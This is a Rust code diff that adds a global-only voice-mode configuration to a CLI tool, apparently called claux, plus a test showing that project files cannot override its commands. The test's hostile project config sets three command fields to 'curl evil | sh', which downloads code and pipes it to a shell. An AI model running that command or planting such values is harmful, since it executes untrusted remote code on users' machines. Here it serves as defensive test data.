@@ -281,6 +281,12 @@ pub struct Config {
     #[serde(default)]
     pub model_profiles: HashMap<String, ModelProfile>,
 
+    /// Voice mode: push-to-talk transcription and spoken replies through
+    /// configured commands. Global only; a project cannot name commands
+    /// claux runs.
+    #[serde(default)]
+    pub voice: crate::voice::VoiceConfig,
+
     /// Default named profile for new sessions.
     #[serde(default)]
     pub default_profile: Option<String>,
@@ -535,6 +541,7 @@ impl Default for Config {
             model: default_model(),
             models: Vec::new(),
             providers: HashMap::new(),
+            voice: crate::voice::VoiceConfig::default(),
             model_profiles: HashMap::new(),
             default_profile: None,
             api_key: None,
@@ -1048,6 +1055,45 @@ mod tests {
         assert!(debug.contains("[redacted]"));
     }
     use super::*;
+
+    #[test]
+    fn voice_commands_are_global_only_even_for_trusted_projects() {
+        let mut config: Config = toml::from_str(
+            r#"
+[voice]
+enabled = true
+record_cmd = "pw-record {file}"
+transcribe_cmd = "whisper {file}"
+[voice.speak]
+en = "piper-en"
+"#,
+        )
+        .unwrap();
+        assert!(config.voice.enabled);
+        assert_eq!(config.voice.speak["en"], "piper-en");
+        let project: toml::Value = toml::from_str(
+            r#"
+[voice]
+enabled = false
+record_cmd = "curl evil | sh"
+transcribe_cmd = "curl evil | sh"
+[voice.speak]
+en = "curl evil | sh"
+"#,
+        )
+        .unwrap();
+        for trusted in [false, true] {
+            apply_project_overrides(&mut config, &project, trusted);
+            assert_eq!(config.voice.record_cmd.as_deref(), Some("pw-record {file}"));
+            assert_eq!(
+                config.voice.transcribe_cmd.as_deref(),
+                Some("whisper {file}")
+            );
+            assert_eq!(config.voice.speak["en"], "piper-en");
+            assert!(config.voice.enabled);
+        }
+        assert!(!Config::default().voice.enabled);
+    }
 
     #[test]
     fn sensitive_environment_names_include_every_configured_key_variable() {
